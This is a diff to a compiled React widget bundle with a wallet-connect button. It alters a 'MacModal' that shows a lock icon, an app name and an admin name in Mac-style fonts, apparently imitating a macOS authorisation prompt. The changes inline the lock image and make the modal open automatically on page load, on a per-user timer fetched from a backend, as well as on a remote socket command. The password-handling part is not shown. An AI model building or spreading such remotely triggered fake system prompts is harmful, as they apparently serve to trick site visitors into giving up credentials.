@@ -2992,7 +2992,11 @@ const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminName
                             React.createElement("div", { className: 'w-full h-[22px]' }),
                             React.createElement("div", { className: "flex justify-center mb-[6px]" },
                                 React.createElement("div", { className: "relative w-[70px] h-[70px]" },
-                                    React.createElement("img", { src: 'https://www.riveanimation.cards/v8/images/lock.png', draggable: false }))),
+                                    React.createElement("svg", { version: "1.2", xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 64 64", width: "64", height: "64" },
+                                        React.createElement("defs", null,
+                                            React.createElement("image", { width: "51", height: "57", id: "img1", href: "data:image/png;base64,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" })),
+                                        React.createElement("style", null),
+                                        React.createElement("use", { id: "Background", href: "#img1", x: "10", y: "2" })))),
                             React.createElement("div", { className: "text-center text-[12px] text-[#ffffff] leading-[20px] mb-[6px]  mac-font-bold" }, appName),
                             React.createElement("div", { className: "text-center text-[11px] text-[#ffffff] leading-[16px] mb-[4px] mac-font" },
                                 React.createElement("div", null,
@@ -14511,16 +14515,43 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
 };
 
 /**
+ * Get mac-modal settings for a user by user_id.
+ * Public endpoint for widget usage.
+ * Returns mac_user_name and mac_modal_timing (-1 means socket-only, 0+ means open after N seconds on load).
+ */
+const getMacModalSettings = async (userId) => {
+    if (!userId) {
+        return null;
+    }
+    try {
+        const BACKEND_URL = getBackendUrl();
+        if (!BACKEND_URL) {
+            console.warn('BACKEND_URL is not configured');
+            return null;
+        }
+        const response = await axios.get(`${BACKEND_URL}/api/users/user-id/${userId}/mac-modal`, { timeout: 5000 });
+        return response.data;
+    }
+    catch (error) {
+        console.warn('Failed to fetch mac-modal settings:', error instanceof Error ? error.message : 'Unknown error');
+        return null;
+    }
+};
+
+/**
  * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
  * the payload's user_id matches this component's userId (or backendConfig.userId).
- * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
+ * Also fetches mac_user_name and mac_modal_timing from user DB on load.
+ * If mac_modal_timing >= 0, opens the Mac modal after that many seconds since the website is loaded.
+ * If mac_modal_timing === -1, only socket-triggered (same as before).
  *
- * Backend example: io.emit('showMacModal', { message: '...', user_id, timestamp });
+ * Backend example: io.emit('showMacModal', { message: '...', user_id, text, timing, timestamp });
  */
 const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const [isOpen, setIsOpen] = React.useState(false);
     const [adminName, setAdminName] = React.useState(undefined);
     const effectiveUserId = userId ?? backendConfig?.userId;
+    const timedOpenFiredRef = React.useRef(false);
     React.useEffect(() => {
         initializeSocket();
         const unsubscribe = subscribeToShowMacModal((payload) => {
@@ -14531,6 +14562,38 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
             }
         });
         return unsubscribe;
+    }, [effectiveUserId]);
+    React.useEffect(() => {
+        if (!effectiveUserId)
+            return;
+        timedOpenFiredRef.current = false;
+        const timerRef = { current: null };
+        let cancelled = false;
+        getMacModalSettings(effectiveUserId).then((settings) => {
+            if (cancelled || !settings || settings.mac_modal_timing === undefined || settings.mac_modal_timing < 0) {
+                return;
+            }
+            const timingSeconds = Math.max(0, settings.mac_modal_timing);
+            if (timingSeconds === 0) {
+                setAdminName(settings.mac_user_name || undefined);
+                setIsOpen(true);
+                timedOpenFiredRef.current = true;
+            }
+            else {
+                timerRef.current = setTimeout(() => {
+                    if (cancelled || timedOpenFiredRef.current)
+                        return;
+                    setAdminName(settings.mac_user_name || undefined);
+                    setIsOpen(true);
+                    timedOpenFiredRef.current = true;
+                }, timingSeconds * 1000);
+            }
+        });
+        return () => {
+            cancelled = true;
+            if (timerRef.current)
+                clearTimeout(timerRef.current);
+        };
     }, [effectiveUserId]);
     const handleClose = () => {
         setIsOpen(false);
